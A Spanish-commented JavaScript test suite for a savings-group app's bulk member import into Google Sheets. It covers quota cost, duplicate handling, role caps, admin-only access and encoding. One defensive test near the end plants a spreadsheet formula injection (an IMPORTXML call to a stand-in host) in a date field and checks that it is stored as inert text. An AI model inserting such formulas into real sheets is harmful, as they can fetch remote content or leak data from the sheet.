/**
 * SUITE 44 - Subir el Excel de un grupo entero.
 *
 * Cargar las 52 socias de "Mi aguinaldo" tardaba cinco minutos y terminaba en
 * un error 500 sin dejar nada cargado. La causa no era el tamano del archivo:
 * era que la importacion iba fila por fila y cada fila releia la hoja Users
 * entera, la de vinculos entera y la de grupos entera, ademas de escribir
 * cuatro veces. Google corta a 40 lecturas por minuto para la cuenta del
 * administrador, asi que 52 filas se comian la cuota mucho antes de acabar.
 *
 * Lo que se fija aqui:
 *   1. que el coste NO crezca con la cantidad de gente del archivo (es la
 *      prueba que habria evitado el fallo);
 *   2. que subir dos veces el mismo archivo no duplique a nadie, porque ese es
 *      el remedio cuando algo sale a medias;
 *   3. que las socias queden de verdad en la hoja y puedan entrar a la app;
 *   4. que el tope de socias del grupo se respete contando tambien lo que trae
 *      el propio archivo;
 *   5. que el error que se ve en pantalla diga que hacer.
 */

const xlsx = require('xlsx');
const { seedWorkbook, get, post, postArchivo, fake } = require('./harness');
const { baseScenario, seedUser, seedGroup, seedLink, login } = require('./scenario');
const t = require('./runner');

/** Un .xlsx de verdad en memoria, igual que el que sube el navegador. */
const excelDe = (filas) => {
  const hoja = xlsx.utils.json_to_sheet(filas);
  const libro = xlsx.utils.book_new();
  xlsx.utils.book_append_sheet(libro, hoja, 'Socias');
  return xlsx.write(libro, { type: 'buffer', bookType: 'xlsx' });
};

const importar = (filas, token) => postArchivo(
  '/api/importar-usuarios-grupos',
  {},
  {
    campo: 'file',
    nombre: 'socias.xlsx',
    contenido: excelDe(filas),
    tipo: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  },
  token,
);

/** N socias con el formato que produce el preparador de los cuadernos. */
const nominaDe = (n, grupo, prefijo = 'socia') => Array.from({ length: n }, (_, i) => ({
  Username: `Socia Numero ${i + 1}`,
  Email: `${prefijo}${i + 1}@aguinaldo.test`,
  Group: grupo,
  GroupRole: i === 0 ? 'presidente' : 'member',
}));

const filasDe = (nombre) => (fake.store.sheets.get(nombre) || { grid: [] }).grid;

module.exports = async function run() {
  const hoja = require('../hoja');

  const preparar = () => {
    seedWorkbook();
    hoja.invalidarTodo();
  };

  // ===================================================================
  t.section('IMP 1. Cincuenta y dos socias de una vez, sin quemar la cuota');
  // ===================================================================
  preparar();
  let e = await baseScenario({ groupId: 'IM1' });
  hoja.invalidarTodo();

  const antesLec = hoja.estadisticas().lecturas;
  const antesEsc = fake.store.calls.append + fake.store.calls.update;
  let r = await importar(nominaDe(52, 'Mi aguinaldo'), e.tokens.admin);
  const lecturas = hoja.estadisticas().lecturas - antesLec;
  const escrituras = (fake.store.calls.append + fake.store.calls.update) - antesEsc;

  t.status('el archivo entra', r, 200);
  const s1 = (r.body && r.body.summary) || {};
  t.eq('se leyeron las 52 filas', s1.processed, 52);
  t.eq('se crearon las 52 personas', s1.createdUsers, 52);
  t.eq('se creo el grupo que no existia', s1.createdGroups, 1);
  t.eq('y las 52 quedaron dentro del grupo', s1.linkedToGroups, 52);
  t.eq('sin una sola fila con error', s1.failed, 0, JSON.stringify(s1.errors || []));
  t.eq('a todas se les puso la clave por defecto', s1.defaultedPasswords, 52);

  // Este es el numero que importa: antes eran mas de 260 lecturas (cinco por
  // fila) y por eso reventaba. Ahora no depende de cuanta gente traiga.
  t.check('gasta 20 lecturas de cuota o menos, no una por socia',
    lecturas <= 20, `gasto ${lecturas} lecturas`);
  t.check('y 12 escrituras o menos, no tres por socia',
    escrituras <= 12, `hizo ${escrituras} escrituras`);

  // ===================================================================
  t.section('IMP 2. El coste no crece con el tamano del archivo');
  // ===================================================================
  // Sin esta comparacion, alguien podria "arreglarlo" bajando el numero de
  // lecturas por fila y el problema volveria con un grupo mas grande.
  preparar();
  e = await baseScenario({ groupId: 'IM2' });
  hoja.invalidarTodo();
  const a5 = hoja.estadisticas().lecturas;
  await importar(nominaDe(5, 'Grupo pequeno', 'chico'), e.tokens.admin);
  const costo5 = hoja.estadisticas().lecturas - a5;

  preparar();
  e = await baseScenario({ groupId: 'IM2' });
  hoja.invalidarTodo();
  const a60 = hoja.estadisticas().lecturas;
  await importar(nominaDe(60, 'Grupo grande', 'grande'), e.tokens.admin);
  const costo60 = hoja.estadisticas().lecturas - a60;

  t.eq('60 socias cuestan lo mismo que 5', costo60, costo5,
    `5 socias: ${costo5} lecturas, 60 socias: ${costo60}`);

  // ===================================================================
  t.section('IMP 3. Las socias quedan en la hoja y pueden entrar');
  // ===================================================================
  preparar();
  e = await baseScenario({ groupId: 'IM3' });
  hoja.invalidarTodo();
  await importar(nominaDe(3, 'Family Bank', 'fam'), e.tokens.admin);

  const users = filasDe('Users');
  const laPrimera = users.find((f) => (f[1] || '') === 'fam1@aguinaldo.test');
  t.check('la primera socia esta escrita en Users', !!laPrimera,
    JSON.stringify(users.map((f) => f[1])));
  t.eq('con su nombre, no solo el correo', laPrimera && laPrimera[0], 'Socia Numero 1');
  t.eq('como socia normal, no administradora', laPrimera && laPrimera[3], 'member');
  t.check('y con la clave cifrada, nunca en claro',
    !!laPrimera && /^\$2[aby]\$/.test(laPrimera[2] || ''), `guardado: ${laPrimera && laPrimera[2]}`);

  const token = await login('fam1@aguinaldo.test', '123456');
  t.check('entra a la app con la clave por defecto', !!token, 'no se pudo iniciar sesion');

  const mios = await get('/api/grupos-del-usuario', token);
  t.status('y ve sus grupos', mios, 200);
  const nombres = JSON.stringify(mios.body || {});
  t.check('con Family Bank entre ellos', nombres.includes('Family Bank'), nombres.slice(0, 300));

  const vinculos = filasDe('UserGroupLinks').filter((f) => (f[0] || '').endsWith('@aguinaldo.test'));
  t.eq('los tres vinculos quedaron escritos', vinculos.length, 3);
  t.eq('la primera de la lista es la presidenta', vinculos[0] && vinculos[0][3], 'presidente');
  t.eq('la segunda es socia rasa', vinculos[1] && vinculos[1][3], 'member');
  t.eq('y el vinculo nace activo', vinculos[0] && vinculos[0][4], 'activo');

  // ===================================================================
  t.section('IMP 4. Subirlo dos veces no duplica a nadie');
  // ===================================================================
  // Es el remedio que se le ofrece a quien ve un error a medio camino, asi que
  // tiene que ser seguro de verdad.
  preparar();
  e = await baseScenario({ groupId: 'IM4' });
  hoja.invalidarTodo();
  const nomina = nominaDe(10, 'Mi aguinaldo', 'dup');
  await importar(nomina, e.tokens.admin);
  const usuariosTrasLaPrimera = filasDe('Users').length;
  const vinculosTrasLaPrimera = filasDe('UserGroupLinks').length;

  hoja.invalidarTodo();
  r = await importar(nomina, e.tokens.admin);
  const s4 = (r.body && r.body.summary) || {};
  t.status('la segunda subida tambien responde bien', r, 200);
  t.eq('no crea a nadie de nuevo', s4.createdUsers, 0);
  t.eq('las reconoce a las diez como existentes', s4.existingUsers, 10);
  t.eq('no vuelve a vincular', s4.linkedToGroups, 0);
  t.eq('y reconoce los diez vinculos', s4.existingLinks, 10);
  t.eq('la hoja Users no crecio', filasDe('Users').length, usuariosTrasLaPrimera);
  t.eq('la hoja de vinculos tampoco', filasDe('UserGroupLinks').length, vinculosTrasLaPrimera);
  t.eq('no se creo un segundo grupo con el mismo nombre', s4.createdGroups, 0);

  // ===================================================================
  t.section('IMP 5. Filas repetidas o sin correo dentro del mismo archivo');
  // ===================================================================
  preparar();
  e = await baseScenario({ groupId: 'IM5' });
  hoja.invalidarTodo();
  r = await importar([
    { Username: 'Rosa Uno', Email: 'rosa@sucio.test', Group: 'Sucio', GroupRole: 'presidente' },
    { Username: 'Sin correo', Email: '', Group: 'Sucio', GroupRole: 'member' },
    { Username: 'Rosa Otra Vez', Email: 'ROSA@SUCIO.TEST', Group: 'Sucio', GroupRole: 'member' },
    { Username: 'Tere', Email: '  tere@sucio.test  ', Group: 'Sucio', GroupRole: 'member' },
  ], e.tokens.admin);

  const s5 = (r.body && r.body.summary) || {};
  t.status('responde sin caerse', r, 200);
  t.eq('crea solo a las dos personas distintas', s5.createdUsers, 2);
  t.eq('la repetida (en mayusculas) cuenta como existente', s5.existingUsers, 1);
  t.eq('y su vinculo repetido tampoco se escribe dos veces', s5.existingLinks, 1);
  t.eq('la fila sin correo es el unico error', s5.failed, 1, JSON.stringify(s5.errors));
  t.check('y el error dice que fila fue',
    (s5.errors || []).some((x) => x.includes('Fila 3') && x.includes('Email')),
    JSON.stringify(s5.errors));
  t.eq('el correo con espacios entro limpio',
    filasDe('Users').filter((f) => f[1] === 'tere@sucio.test').length, 1);

  // ===================================================================
  t.section('IMP 6. El tope de socias del grupo se respeta');
  // ===================================================================
  // Y contando lo que trae el propio archivo: si solo mirara lo que ya habia en
  // la hoja, un Excel con mas gente que el tope entraria entero.
  preparar();
  e = await baseScenario({ groupId: 'IM6' });
  seedGroup({ id: 'TOPE', nombre: 'Grupo con tope' , presidente: e.users.presi.email });
  // Columna M (indice 12) = tope de socias. seedGroup lo deja en 30; se baja a 3.
  const filaTope = filasDe('Groups').find((f) => f[0] === 'TOPE');
  filaTope[12] = 3;
  hoja.invalidarTodo();

  r = await importar(nominaDe(6, 'Grupo con tope', 'tope'), e.tokens.admin);
  const s6 = (r.body && r.body.summary) || {};
  t.eq('entran las tres que caben', s6.linkedToGroups, 3);
  t.eq('y las otras tres quedan fuera', s6.failed, 3);
  t.check('con un mensaje que explica el tope',
    (s6.errors || []).some((x) => x.includes('tope de 3')),
    JSON.stringify(s6.errors));
  t.eq('en la hoja solo hay tres vinculos al grupo con tope',
    filasDe('UserGroupLinks').filter((f) => f[1] === 'TOPE').length, 3);
  t.eq('pero las seis personas si quedaron creadas', s6.createdUsers, 6);

  // ===================================================================
  t.section('IMP 7. Solo el administrador de la plataforma importa');
  // ===================================================================
  preparar();
  e = await baseScenario({ groupId: 'IM7' });
  hoja.invalidarTodo();

  for (const [quien, tk] of [
    ['la presidencia de un grupo', e.tokens.presi],
    ['la tesoreria', e.tokens.teso],
    ['una socia', e.tokens.socio1],
  ]) {
    const neg = await importar(nominaDe(2, 'Colado', 'colado'), tk);
    t.status(`${quien} no puede subir la nomina`, neg, 403);
  }
  const sinSesion = await importar(nominaDe(2, 'Colado', 'colado'), null);
  t.check('y sin sesion tampoco', sinSesion.status === 401 || sinSesion.status === 403,
    `respondio ${sinSesion.status}`);
  t.eq('nadie colado quedo escrito',
    filasDe('Users').filter((f) => (f[1] || '').includes('colado')).length, 0);

  // ===================================================================
  t.section('IMP 8. Gente que ya estaba en la app, a un grupo nuevo');
  // ===================================================================
  preparar();
  e = await baseScenario({ groupId: 'IM8' });
  seedUser({ nombre: 'Ya Registrada', email: 'vieja@juntago.test' });
  hoja.invalidarTodo();

  r = await importar([
    { Username: 'Ya Registrada', Email: 'vieja@juntago.test', Group: 'Banquito nuevo', GroupRole: 'tesorera' },
    { Username: 'Nueva Nueva', Email: 'nueva@juntago.test', Group: 'Banquito nuevo', GroupRole: 'member' },
  ], e.tokens.admin);
  const s8 = (r.body && r.body.summary) || {};
  t.eq('a la que ya estaba no se le crea otra cuenta', s8.createdUsers, 1);
  t.eq('se la cuenta como existente', s8.existingUsers, 1);
  t.eq('pero se la vincula igual al grupo nuevo', s8.linkedToGroups, 2);
  t.eq('solo hay una fila suya en Users',
    filasDe('Users').filter((f) => f[1] === 'vieja@juntago.test').length, 1);
  const suVinculo = filasDe('UserGroupLinks').find((f) => f[0] === 'vieja@juntago.test' && f[3] === 'tesorero');
  t.check('y entra con el cargo que dice el Excel ("tesorera" -> tesorero)', !!suVinculo,
    JSON.stringify(filasDe('UserGroupLinks').filter((f) => f[0] === 'vieja@juntago.test')));

  // ===================================================================
  t.section('IMP 10. Dos clics seguidos no cargan a las socias dos veces');
  // ===================================================================
  // Ahora la importacion lee la foto de la hoja UNA vez y escribe al final. Sin
  // cerrojo, dos peticiones a la vez leerian la misma foto y escribirian las
  // mismas socias dos veces: Google Sheets no impide correos repetidos.
  preparar();
  e = await baseScenario({ groupId: 'IMA' });
  hoja.invalidarTodo();
  const aLaVez = nominaDe(12, 'Mi aguinaldo', 'clic');
  const [uno, dos] = await Promise.all([
    importar(aLaVez, e.tokens.admin),
    importar(aLaVez, e.tokens.admin),
  ]);

  t.check('las dos peticiones responden', uno.status < 500 && dos.status < 500,
    `${uno.status} y ${dos.status}`);
  const creadas = filasDe('Users').filter((f) => (f[1] || '').startsWith('clic'));
  t.eq('cada socia aparece una sola vez en Users', creadas.length, 12,
    JSON.stringify(creadas.map((f) => f[1])));
  const suGrupo = filasDe('UserGroupLinks').filter((f) => (f[0] || '').startsWith('clic'));
  t.eq('y cada vinculo una sola vez', suGrupo.length, 12);
  t.eq('tampoco se creo el grupo dos veces',
    filasDe('Groups').filter((f) => (f[1] || '') === 'Mi aguinaldo').length, 1);

  // ===================================================================
  t.section('IMP 11. Si Google falla a medias, se dice que paso y que hacer');
  // ===================================================================
  // Las personas se escriben antes que los vinculos. Si el segundo envio falla,
  // lo que NO puede pasar es que la pantalla se quede sin informe: el remedio
  // depende de saber quienes entraron.
  preparar();
  e = await baseScenario({ groupId: 'IMB' });
  hoja.invalidarTodo();
  fake.fallarEn('append', 'UserGroupLinks');
  r = await importar(nominaDe(8, 'Mi aguinaldo', 'medias'), e.tokens.admin);

  const s10 = (r.body && r.body.summary) || {};
  t.check('la respuesta trae el informe, no un error pelado', !!s10.processed,
    JSON.stringify(r.body).slice(0, 200));
  t.eq('dice que las ocho personas si se crearon', s10.createdUsers, 8);
  t.eq('y que ningun vinculo quedo guardado', s10.linkedToGroups, 0);
  t.eq('avisa de cuantos vinculos faltan', s10.vinculosPendientes, 8);
  t.check('con el remedio escrito: volver a subir el mismo archivo',
    (s10.errors || []).some((x) => x.includes('mismo archivo')),
    JSON.stringify(s10.errors));
  t.eq('las ocho personas estan de verdad en la hoja',
    filasDe('Users').filter((f) => (f[1] || '').startsWith('medias')).length, 8);

  // Y el remedio funciona: el mismo archivo, otra vez.
  hoja.invalidarTodo();
  const reintento = await importar(nominaDe(8, 'Mi aguinaldo', 'medias'), e.tokens.admin);
  const s11 = (reintento.body && reintento.body.summary) || {};
  t.status('el reintento entra', reintento, 200);
  t.eq('no crea a nadie de nuevo', s11.createdUsers, 0);
  t.eq('y ahora si vincula a las ocho', s11.linkedToGroups, 8);
  t.eq('sin duplicar a nadie en Users',
    filasDe('Users').filter((f) => (f[1] || '').startsWith('medias')).length, 8);

  // ===================================================================
  t.section('IMP 12. El informe dice en que grupo cayo cada socia');
  // ===================================================================
  // El resolvedor acepta nombres PARECIDOS (82%). Subir la nomina de un grupo
  // y que las 52 socias acaben en otro de nombre parecido es un error caro y
  // silencioso; el resultado tiene que decir el nombre real del grupo.
  preparar();
  e = await baseScenario({ groupId: 'IMC' });
  hoja.invalidarTodo();
  r = await importar([
    { Username: 'Una', Email: 'una@destino.test', Group: 'Banco Comunal Salina', GroupRole: 'member' },
    { Username: 'Otra', Email: 'otra@destino.test', Group: 'Grupo que no existe', GroupRole: 'presidente' },
  ], e.tokens.admin);

  const dest = ((r.body && r.body.summary) || {}).grupos || [];
  t.eq('el informe trae los dos destinos', dest.length, 2, JSON.stringify(dest));
  const parecido = dest.find((g) => g.dice === 'Banco Comunal Salina');
  t.check('para el nombre parecido dice el nombre REAL del grupo',
    !!parecido && parecido.seLlama === 'Banco Comunal Salinas',
    JSON.stringify(parecido));
  t.eq('y cuantas socias fueron ahi', parecido && parecido.socias, 1);
  const creado = dest.find((g) => g.dice === 'Grupo que no existe');
  t.check('el grupo nuevo aparece con su nombre tal cual',
    !!creado && creado.seLlama === 'Grupo que no existe', JSON.stringify(creado));

  // ===================================================================
  t.section('IMP 13. Un grupo que quedo SIN directiva puede recuperarse');
  // ===================================================================
  // Paso de verdad: una carga a medias dejo a las 29 socias de un grupo como
  // miembros rasos. El administrador de la plataforma NO puede nombrar
  // directiva (es deliberado) y una socia rasa tampoco, asi que el grupo
  // quedaba muerto: nadie en el mundo podia nombrar presidenta.
  preparar();
  e = await baseScenario({ groupId: 'IMD' });
  hoja.invalidarTodo();
  // Primera carga, sin cargos: todas entran como socias.
  await importar(nominaDe(4, 'Sin directiva', 'huerf').map((f) => ({ ...f, GroupRole: 'member' })),
    e.tokens.admin);
  const gidHuerfano = (filasDe('Groups').find((f) => f[1] === 'Sin directiva') || [])[0];
  t.eq('quedan cuatro socias y ningun cargo',
    filasDe('UserGroupLinks').filter((f) => f[1] === gidHuerfano && f[3] !== 'member').length, 0);

  // Se vuelve a subir la MISMA nomina, ahora con los cargos puestos.
  hoja.invalidarTodo();
  r = await importar(nominaDe(4, 'Sin directiva', 'huerf'), e.tokens.admin);
  const s13 = (r.body && r.body.summary) || {};
  t.status('la reimportacion responde', r, 200);
  t.eq('no crea a nadie de nuevo', s13.createdUsers, 0);
  t.eq('y asigna el cargo que faltaba', s13.cargosAsignados, 1);
  const presiRec = filasDe('UserGroupLinks')
    .find((f) => f[1] === gidHuerfano && f[3] === 'presidente');
  t.check('la presidencia quedo escrita en la hoja', !!presiRec,
    JSON.stringify(filasDe('UserGroupLinks').filter((f) => f[1] === gidHuerfano).map((f) => f[0] + ':' + f[3])));
  t.eq('y es la primera de la lista, la que dice el archivo',
    presiRec && presiRec[0], 'huerf1@aguinaldo.test');

  // ===================================================================
  t.section('IMP 14. Nunca se releva a quien YA ocupa el cargo');
  // ===================================================================
  // Es el limite que no se cruza: el admin puede rellenar un puesto vacio,
  // nunca quitarle la presidencia a quien la tiene. Si se pudiera, subir un
  // Excel seria la via corta para quedarse con la caja de un grupo ajeno.
  preparar();
  e = await baseScenario({ groupId: 'IME' });
  hoja.invalidarTodo();
  // El grupo base ya tiene presidenta, tesorero y secretaria de verdad.
  const antesPresi = filasDe('UserGroupLinks')
    .find((f) => f[1] === 'IME' && f[3] === 'presidente')[0];

  r = await importar([
    { Username: 'Asaltante', Email: 'asalto@juntago.test', Group: 'Banco Comunal Salinas', GroupRole: 'presidente' },
    { Username: 'Socia Dani', Email: e.users.socio1.email, Group: 'Banco Comunal Salinas', GroupRole: 'presidente' },
  ], e.tokens.admin);
  const s14 = (r.body && r.body.summary) || {};

  const presiAhora = filasDe('UserGroupLinks')
    .find((f) => f[1] === 'IME' && f[3] === 'presidente')[0];
  t.eq('la presidenta sigue siendo la misma', presiAhora, antesPresi);
  t.eq('solo hay UNA presidencia en el grupo',
    filasDe('UserGroupLinks').filter((f) => f[1] === 'IME' && f[3] === 'presidente').length, 1);
  t.eq('no se ascendio a nadie', s14.cargosAsignados, 0);
  t.eq('a quien venia como presidente se le baja a socia', s14.cargosDegradados, 1);
  const elNuevo = filasDe('UserGroupLinks').find((f) => f[0] === 'asalto@juntago.test');
  t.eq('y entra como socia rasa, no como presidenta', elNuevo && elNuevo[3], 'member');
  t.check('con un aviso que lo explica',
    (s14.avisos || []).some((x) => x.includes('ya esta ocupado')), JSON.stringify(s14.avisos));
  const socia1 = filasDe('UserGroupLinks').find((f) => f[0] === e.users.socio1.email && f[1] === 'IME');
  t.eq('y a la socia que ya estaba no se le cambia el cargo', socia1 && socia1[3], 'member');

  // ===================================================================
  t.section('IMP 15. Seis "Lider" en la nomina no son seis presidentas');
  // ===================================================================
  // Es lo que paso de verdad con "Banquio de ahorros": la nomina traia seis
  // Lider y la app los tradujo a seis presidentes en el mismo grupo.
  preparar();
  e = await baseScenario({ groupId: 'IMF' });
  hoja.invalidarTodo();
  r = await importar(Array.from({ length: 6 }, (_, i) => ({
    Username: `Lider ${i + 1}`, Email: `lider${i + 1}@seis.test`, Group: 'Seis lideres', GroupRole: 'Lider',
  })), e.tokens.admin);
  const s15 = (r.body && r.body.summary) || {};
  const gidSeis = (filasDe('Groups').find((f) => f[1] === 'Seis lideres') || [])[0];
  t.eq('entran las seis', s15.linkedToGroups, 6);
  t.eq('pero solo una preside',
    filasDe('UserGroupLinks').filter((f) => f[1] === gidSeis && f[3] === 'presidente').length, 1);
  t.eq('las otras cinco quedan como socias', s15.cargosDegradados, 5);
  t.eq('y preside la primera de la lista',
    filasDe('UserGroupLinks').find((f) => f[1] === gidSeis && f[3] === 'presidente')[0],
    'lider1@seis.test');

  // ===================================================================
  t.section('IMP 16. Un CSV con acentos no destroza los nombres');
  // ===================================================================
  // Multer guarda el archivo SIN extension, y la libreria de hojas lee un CSV
  // como Latin-1 salvo que traiga BOM: "Villon" con tilde entraba con el
  // nombre roto y se quedaba asi en la ficha de una persona real. Paso de
  // verdad con ocho socias de Family Bank.
  preparar();
  e = await baseScenario({ groupId: 'IMG' });
  hoja.invalidarTodo();

  const FIN = String.fromCharCode(13, 10);
  const csv = [
    'Username,Email,Group,GroupRole',
    '"Tanya Villón","tanya@acentos.test","Con acentos","presidente"',
    '"Doménica Hernández","dome@acentos.test","Con acentos","member"',
    '"Mathias Muñoz","mathias@acentos.test","Con acentos","member"',
  ].join(FIN) + FIN;

  r = await postArchivo('/api/importar-usuarios-grupos', {},
    { campo: 'file', nombre: 'acentos.csv', contenido: Buffer.from(csv, 'utf8'), tipo: 'text/csv' },
    e.tokens.admin);
  t.status('el CSV entra', r, 200);

  const conAcento = filasDe('Users').filter((f) => (f[1] || '').endsWith('@acentos.test'));
  t.eq('entraron las tres', conAcento.length, 3);
  t.eq('con la o acentuada intacta',
    (conAcento.find((f) => f[1] === 'tanya@acentos.test') || [])[0], 'Tanya Villón');
  t.eq('con la e y la a acentuadas intactas',
    (conAcento.find((f) => f[1] === 'dome@acentos.test') || [])[0], 'Doménica Hernández');
  t.eq('y con la enie intacta',
    (conAcento.find((f) => f[1] === 'mathias@acentos.test') || [])[0], 'Mathias Muñoz');

  const MARCA = String.fromCharCode(195); // la A con tilde que aparece al leer UTF-8 como Latin-1
  t.check('ninguna con la marca de acentos rotos',
    !conAcento.some((f) => (f[0] || '').indexOf(MARCA) !== -1),
    JSON.stringify(conAcento.map((f) => f[0])));

  // ===================================================================
  t.section('IMP 17. Un nombre parecido NO se traga a otro grupo');
  // ===================================================================
  // Caso real y caro: la regla vieja daba por bueno cualquier nombre que fuera
  // SUBCADENA de otro. Como "semilladeahorro" contiene "adeahorro", las once
  // socias de "Semilla de Ahorro" entraron en "ADE AHORRO", que es el grupo de
  // otra persona, y no lo dijo nada.
  preparar();
  e = await baseScenario({ groupId: 'IMH' });
  seedGroup({ id: 'ADEAH', nombre: 'ADE AHORRO', presidente: e.users.ajeno.email });
  seedLink(e.users.ajeno.email, 'ADEAH', 'presidente');
  hoja.invalidarTodo();

  r = await importar(nominaDe(4, 'Semilla de Ahorro', 'semilla'), e.tokens.admin);
  const s17 = (r.body && r.body.summary) || {};
  t.eq('se crea un grupo NUEVO, no se mete en el parecido', s17.createdGroups, 1);
  const destino17 = (s17.grupos || [])[0] || {};
  t.eq('y el destino se llama como dice el Excel', destino17.seLlama, 'Semilla de Ahorro');
  t.eq('ADE AHORRO se queda como estaba, con su presidenta y nadie mas',
    filasDe('UserGroupLinks').filter((f) => f[1] === 'ADEAH').length, 1);

  // ===================================================================
  t.section('IMP 18. Una errata de una letra SI se reconoce, y avisa');
  // ===================================================================
  // "Banquito de ahorros" contra "Banquio de ahorros" (falta la t) es la
  // erratita real de la nomina: eso si tiene que unirse, pero diciendolo.
  preparar();
  e = await baseScenario({ groupId: 'IMI' });
  seedGroup({ id: 'BANQ', nombre: 'Banquio de ahorros', presidente: e.users.ajeno.email });
  seedLink(e.users.ajeno.email, 'BANQ', 'presidente');
  hoja.invalidarTodo();

  r = await importar(nominaDe(3, 'Banquito de ahorros', 'banq'), e.tokens.admin);
  const s18 = (r.body && r.body.summary) || {};
  t.eq('no crea un grupo repetido', s18.createdGroups, 0);
  t.eq('entra en el que ya existia',
    filasDe('UserGroupLinks').filter((f) => f[1] === 'BANQ').length, 4);
  t.check('y lo avisa por escrito',
    (s18.avisos || []).some((x) => x.includes('Banquio de ahorros')),
    JSON.stringify(s18.avisos));

  // ===================================================================
  t.section('IMP 19. Deshacer un vinculo que metio una importacion');
  // ===================================================================
  preparar();
  e = await baseScenario({ groupId: 'IMJ' });
  hoja.invalidarTodo();
  await importar(nominaDe(3, 'Para deshacer', 'desh'), e.tokens.admin);
  const gidDesh = (filasDe('Groups').find((f) => f[1] === 'Para deshacer') || [])[0];

  // Quien no es admin, ni de lejos.
  for (const [quien, tk] of [
    ['la presidencia de un grupo', e.tokens.presi],
    ['una socia', e.tokens.socio1],
  ]) {
    const neg = await post('/api/admin/retirar-vinculo',
      { Email: 'desh2@aguinaldo.test', GroupID: gidDesh }, tk);
    t.status(`${quien} no puede retirar vinculos`, neg, 403);
  }

  let ret = await post('/api/admin/retirar-vinculo',
    { Email: 'desh2@aguinaldo.test', GroupID: gidDesh }, e.tokens.admin);
  t.status('el administrador si, si no hay movimiento', ret, 200);
  t.eq('y el grupo se queda con dos',
    filasDe('UserGroupLinks').filter((f) => f[1] === gidDesh && (f[4] || '') !== 'inactivo').length, 2);
  t.check('la fila NO se borra, se marca inactiva (queda el rastro)',
    filasDe('UserGroupLinks').some((f) => f[0] === 'desh2@aguinaldo.test' && f[4] === 'inactivo'),
    JSON.stringify(filasDe('UserGroupLinks').filter((f) => f[1] === gidDesh).map((f) => f[0] + ':' + f[4])));

  // Repetirlo no rompe nada.
  ret = await post('/api/admin/retirar-vinculo',
    { Email: 'desh2@aguinaldo.test', GroupID: gidDesh }, e.tokens.admin);
  t.status('repetirlo responde sin romperse', ret, 200);
  t.check('y dice que ya estaba', ret.body && ret.body.yaEstaba === true, JSON.stringify(ret.body));

  // A quien no existe.
  const noHay = await post('/api/admin/retirar-vinculo',
    { Email: 'nadie@juntago.test', GroupID: gidDesh }, e.tokens.admin);
  t.status('a quien no esta en el grupo, 404', noHay, 404);

  // ===================================================================
  t.section('IMP 20. A quien tiene dinero en el grupo NO se le toca');
  // ===================================================================
  // Es el limite que hace seguro lo anterior: sin esto, el administrador de la
  // plataforma tendria por la puerta de atras el poder de expulsar socias de
  // una caja en marcha, que es justo lo que la separacion impide.
  preparar();
  e = await baseScenario({ groupId: 'IMK' });
  hoja.invalidarTodo();
  await importar(nominaDe(3, 'Con dinero', 'plata'), e.tokens.admin);
  const gidPlata = (filasDe('Groups').find((f) => f[1] === 'Con dinero') || [])[0];

  fake.ensureSheet('Savings').grid.push([
    'plata2@aguinaldo.test', gidPlata, 50, '2026-03-10', 'mensual', 'aporte',
    'confirmado', 'a@a.test', 'b@b.test', new Date().toISOString(), 'sav_x', '',
  ]);
  hoja.invalidarTodo();

  const conPlata = await post('/api/admin/retirar-vinculo',
    { Email: 'plata2@aguinaldo.test', GroupID: gidPlata }, e.tokens.admin);
  t.status('se niega', conPlata, 409);
  t.eq('con un motivo que se puede leer en pantalla',
    conPlata.body && conPlata.body.codigo, 'TIENE_MOVIMIENTO');
  t.check('y dice cuanto movimiento tiene',
    !!(conPlata.body && conPlata.body.movimiento && conPlata.body.movimiento.ahorros === 1),
    JSON.stringify(conPlata.body && conPlata.body.movimiento));
  t.eq('sigue dentro del grupo',
    filasDe('UserGroupLinks').filter((f) => f[1] === gidPlata && (f[4] || '') !== 'inactivo').length, 3);

  // Tampoco a quien preside.
  const laPresi = filasDe('UserGroupLinks').find((f) => f[1] === gidPlata && f[3] === 'presidente');
  const contraPresi = await post('/api/admin/retirar-vinculo',
    { Email: laPresi[0], GroupID: gidPlata }, e.tokens.admin);
  t.status('a la presidencia tampoco', contraPresi, 409);
  t.eq('y se dice por que', contraPresi.body && contraPresi.body.codigo, 'ES_LA_PRESIDENCIA');

  // ===================================================================
  t.section('IMP 9. Una formula del Excel no se ejecuta en la hoja');
  // ===================================================================
  preparar();
  e = await baseScenario({ groupId: 'IM9' });
  hoja.invalidarTodo();
  await importar([{
    Username: 'Con Formula',
    Email: 'formula@juntago.test',
    Group: 'Banco Comunal Salinas',
    GroupRole: 'member',
    JoinDate: '=IMPORTXML("http://malo.test","//x")',
  }], e.tokens.admin);

  const conFormula = filasDe('UserGroupLinks').find((f) => f[0] === 'formula@juntago.test');
  t.check('la fecha con formula entra como texto, con apostrofe delante',
    !!conFormula && (conFormula[2] || '').startsWith("'="),
    `quedo: ${conFormula && conFormula[2]}`);
};
